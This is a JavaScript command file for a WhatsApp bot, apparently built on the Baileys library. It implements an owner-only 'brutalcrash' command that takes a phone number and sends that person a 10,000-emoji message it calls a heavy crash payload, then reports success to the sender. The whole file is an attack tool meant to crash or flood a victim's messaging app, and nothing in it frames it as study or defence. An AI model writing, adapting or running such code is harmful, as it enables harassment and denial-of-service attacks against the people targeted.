import { isOwner, sendError } from '../lib/utils.js';;

let cooldownBrutal = 0;

export default {
    name: 'brutalcrash',
    aliases: [],
    description: 'Sends heavy crash payload to target (owner only)',
    isPremium: true,
    groupOnly: false,
    privateOnly: true,
    adminOnly: true,
    category: 'bug',

    async execute(sock, message, args) {
        const from = message.key.remoteJid;
        const sender = message.key.participant || from;

        if (!isOwner(sender)) 
            return await sendError(sock, from, 'Only owners can use this command.');

        const currentTime = Date.now();
        if (currentTime - cooldownBrutal < 5000) 
            return await sendError(sock, from, `Please wait before using this command again.`);

        const phoneNumber = args[0]?.replace(/\D/g, '');
        if (!phoneNumber || phoneNumber.length < 10) 
            return await sendError(sock, from, `Provide a valid phone number.`);

        const targetJid = `${phoneNumber}@s.whatsapp.net`;

        try {
            const crashPayload = '🧨'.repeat(10000);
            await sock.sendMessage(targetJid, { text: crashPayload });
            await sock.sendMessage(from, { text: `Brutal crash sent to ${phoneNumber} ✅` });
            cooldownBrutal = currentTime;
        } catch (error) {
            await sendError(sock, from, 'Brutal crash send failed.');
        }
    }
};